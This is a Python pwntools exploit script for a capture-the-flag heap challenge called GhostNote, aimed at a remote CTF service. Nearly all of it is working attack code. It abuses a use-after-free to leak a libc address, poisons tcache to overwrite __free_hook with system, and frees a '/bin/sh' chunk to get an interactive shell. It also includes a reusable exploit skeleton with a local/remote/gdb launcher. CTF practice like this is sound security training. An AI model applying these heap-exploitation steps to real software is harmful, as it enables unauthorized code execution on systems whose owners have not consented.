#!/usr/bin/env python3
from pwn import *
import sys, argparse, os, sys

elf = libc = rop = io = CUSTOM_LD = CUSTOM_LIBC = gs =  None
args = binary = None
REMOTE = []

r, ra, rl, ru, rr, cl = (lambda *a, **k: io.recv(*a, **k),
	lambda *a, **k: io.recvall(*a, **k),                    
	lambda *a, **k: io.recvline(*a, **k),
	lambda *a, **k: io.recvuntil(*a, **k),
	lambda *a, **k: io.recvregex(*a, **k),
	lambda *a, **k: io.clean(*a, **k)
)

s, sa, st, sl, sla, slt, ia = (
	lambda *a, **k: io.send(*a, **k),
	lambda *a, **k: io.sendafter(*a, **k),
	lambda *a, **k: io.sendthen(*a, **k),
	lambda *a, **k: io.sendline(*a, **k),
	lambda *a, **k: io.sendlineafter(*a, **k),
	lambda *a, **k: io.sendlinethen(*a, **k),
	lambda *a, **k: io.interactive(*a, **k)
)
		
def parse_args():
	p = argparse.ArgumentParser(description='Exploit skeleton')
	p.add_argument('mode', choices=['local','remote','gdb','debug'], nargs='?', default='local')
	p.add_argument('--libc', help='Path to provided libc.so.6')
	p.add_argument('--ld',   help='Path to provided ld.so')
	p.add_argument('--host', help='Remote host')
	p.add_argument('--port', type=int, help='Remote port')
	p.add_argument('--no-aslr', action='store_true', help='Disable ASLR (for debugging)')
	return p.parse_args()

def build_cmd(binary):
	"""Return (argv, env) tuple for process() depending on CUSTOM_LIBC/LD"""
	if CUSTOM_LD and CUSTOM_LIBC:
		# Use custom loader with library path
		lib_dir = os.path.dirname(CUSTOM_LIBC)
		argv = [CUSTOM_LD, "--library-path", lib_dir, binary]
		env = {}
		return argv, env
	elif CUSTOM_LIBC:
		# Use LD_PRELOAD
		argv = [binary]
		env = {"LD_PRELOAD": os.path.abspath(CUSTOM_LIBC)}
		return argv, env
	else:
		# Normal execution
		argv = [binary]
		env = {}
		return argv, env
	
def start():
	if binary == None or binary == "./":
		log.failure('Binary executable to found')
		sys.exit(0)

	global elf, rop, libc
	elf = context.binary = ELF(binary, checksec=False)
	
	if CUSTOM_LIBC:
		libc = ELF(CUSTOM_LIBC, checksec=False)
		#context.libc = libc
	else:
		libc = elf.libc
	
	rop = ROP(elf)

	argv, env = build_cmd(elf.path)
	
	if args.no_aslr:
		env['LD_PRELOAD'] = env.get('LD_PRELOAD', '') + ':' if 'LD_PRELOAD' in env else ''
		env['LD_PRELOAD'] += 'libc.so.6'  # This is a hack, better to use setarch
		# Alternative: use setarch to disable ASLR
		argv = ['setarch', 'x86_64', '-R'] + argv

	if args.mode in ('gdb','debug'):
		return gdb.debug(argv, env=env, gdbscript=gs, api=True)

	if args.mode == 'remote':
		host = args.host or (REMOTE[0] if REMOTE else None)
		port = args.port or (REMOTE[1] if len(REMOTE) > 1 else None)
		if not (host and port):
			log.error("Remote mode selected but no host/port specified!")
			log.error("Use --host/--port or set REMOTE variable")
			sys.exit(1)
		return remote(host, port)

	
	return process(argv, env=env)


def print_leak(description, addr):
	"""Helper to leak and log addresses"""
	log.info(f"{description} @ {hex(addr)}")
	return addr

def setup():
	"""Initialize pwntools context"""
	context(os='linux')
	context.terminal = ["terminator", "--new-tab", "-e"]
	context.log_level = 'info'
	context.timeout = 3


class GhostNote:
	def __init__(self):
		pass

	def menu(self, choice):
		sla(b"> ", str(choice).encode())

	def send_index(self, index):
		sla(b"Index: ", str(index).encode())

	def add_note(self, index:int, size:int, note:bytes):
		self.menu(1)
		log.info(f"Adding Note | index {index} | {note[:8]}")
		sla(b"(0-9): ", str(index).encode())
		sla(b"Size: ", str(size).encode())
		sla(b"Content: ", note)
		rl()

	def delete_note(self, index):
		log.info(f"Delete Note | index {index}")
		self.menu(2)
		self.send_index(index)
		rl()

	def edit_note(self, index, note):
		log.info(f"Edit Note | index {index} | {note[:8]}")
		self.menu(4)
		self.send_index(index)
		sa(b"New Content: ", note)
		#ru(b"New Content: ")
		#s(note)

	def show_note(self, index):
		log.failure(f"Show Note | index {index}")
		self.menu(3)
		#self.send_index(3)
		sla(b"Index: ", str(index).encode())
		ru(b"Data: ")
		data = rl().rstrip(b"\r\n")
		#print(data[:8])
		try: 
			data = data[:8]
			leak = u64(data.ljust(8, b"\x00"))
			print_leak("Leak", leak)
			return leak
		except:
			log.info(f"Data: {data}")
			return 0




def exploit():
	##################################################################### 
	######################## EXPLOIT CODE ###############################
	#####################################################################
	gn = GhostNote()

	# leak | find libc base
	gn.add_note(8, 0x600, b"A"*0xf)
	gn.add_note(9, 0x10, b"/bin/sh\x00")
	gn.delete_note(8)
	leak = gn.show_note(8)
	libc.address = leak - 0x1ecbe0
	one_gadget = 0xe3afe
	print_leak("libc base", libc.address)
	print_leak("__free_hook", libc.sym.__free_hook)
	
	gn.add_note(0, 0x60, b"X"*0x48)
	gn.add_note(1, 0x60, b"Y"*0x48)


	gn.delete_note(0)
	gn.delete_note(1)

	gn.edit_note(1, p64(libc.sym.__free_hook))
	gn.add_note(2, 0x60, b"B"*0x48) # same as 1
	
	gn.add_note(3, 0x60, p64(libc.sym.system))

	gn.delete_note(9)

	

	


	
if __name__ == "__main__":
	# === per-challenge config ===
	binary = "./chall_patched"
	REMOTE = ["ctf.nexus-security.club",2808]
	CUSTOM_LIBC = None
	CUSTOM_LD = None
	
	gs = """
	break *edit_note
	continue
	"""
	# ============================
	setup()
	args = parse_args()
	if args.libc: CUSTOM_LIBC = args.libc
	if args.ld:   CUSTOM_LD   = args.ld

	io = start()
	exploit()
	ia()


